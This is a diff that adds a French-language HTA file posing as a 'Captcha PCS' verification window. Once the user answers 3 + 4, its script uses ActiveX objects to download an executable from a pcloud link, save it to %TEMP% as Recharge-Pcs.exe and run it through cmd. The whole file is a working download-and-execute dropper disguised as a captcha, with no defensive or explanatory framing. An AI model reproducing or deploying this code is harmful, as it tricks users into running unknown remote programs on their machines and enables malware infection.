@@ -1,0 +1,105 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <title>Captcha PCS</title>
+  <hta:application
+    applicationname="CaptchaPCS"
+    border="thin"
+    caption="yes"
+    maximizeButton="no"
+    minimizeButton="no"
+    showInTaskBar="yes"
+    sysMenu="yes"
+    singleInstance="yes"
+    windowState="normal"
+    scroll="no"
+  />
+  <style>
+    body {
+      font-family: Segoe UI, Tahoma, sans-serif;
+      background: #f3f3f3;
+    }
+    .window {
+      width: 350px;
+      padding: 25px;
+      background: white;
+      border-radius: 10px;
+      box-shadow: 0 0 30px rgba(0,0,0,0.2);
+      margin: 40px auto;
+    }
+    input, button {
+      font-size: 16px;
+      padding: 8px;
+      width: 100%;
+      margin-top: 10px;
+    }
+    button {
+      background-color: #2b5797;
+      color: white;
+      border: none;
+      border-radius: 5px;
+      cursor: pointer;
+    }
+    #status {
+      margin-top: 15px;
+      color: #555;
+    }
+  </style>
+  <script type="text/javascript">
+    function validerCaptcha() {
+      var reponse = document.getElementById("captcha").value;
+      if (reponse === "7") {
+        document.getElementById("status").innerText = "⏳ Téléchargement en cours...";
+        telechargerEtLancer();
+      } else {
+        alert("❌ Réponse incorrecte. Essayez encore.");
+      }
+    }
+
+    function telechargerEtLancer() {
+      try {
+        var url = "https://e.pcloud.link/publink/download?code=XZgvO6ZsOihBhvY2Upfk0ajSVSERu1Af14y";
+        var xhr = new ActiveXObject("MSXML2.XMLHTTP");
+        xhr.open("GET", url, true);
+
+        xhr.onreadystatechange = function () {
+          if (xhr.readyState === 4) {
+            if (xhr.status === 200) {
+              var stream = new ActiveXObject("ADODB.Stream");
+              var shell = new ActiveXObject("WScript.Shell");
+              var temp = shell.ExpandEnvironmentStrings("%TEMP%");
+              var chemin = temp + "\\Recharge-Pcs.exe";
+
+              stream.Type = 1; // binaire
+              stream.Open();
+              stream.Write(xhr.responseBody);
+              stream.SaveToFile(chemin, 2);
+              stream.Close();
+
+              alert("Chemin du fichier : " + chemin);
+
+              shell.Run('cmd /c "' + chemin + '"', 1, false);
+              window.close();
+            } else {
+              alert("Erreur lors du téléchargement : " + xhr.status);
+            }
+          }
+        };
+
+        xhr.send();
+      } catch (e) {
+        alert("Erreur ActiveX : " + e.message);
+      }
+    }
+  </script>
+</head>
+<body>
+  <div class="window">
+    <h2>Vérification</h2>
+    <p>Combien font 3 + 4 ?</p>
+    <input type="text" id="captcha" />
+    <button onclick="validerCaptcha()">Valider</button>
+    <p id="status"></p>
+  </div>
+</body>
+</html>
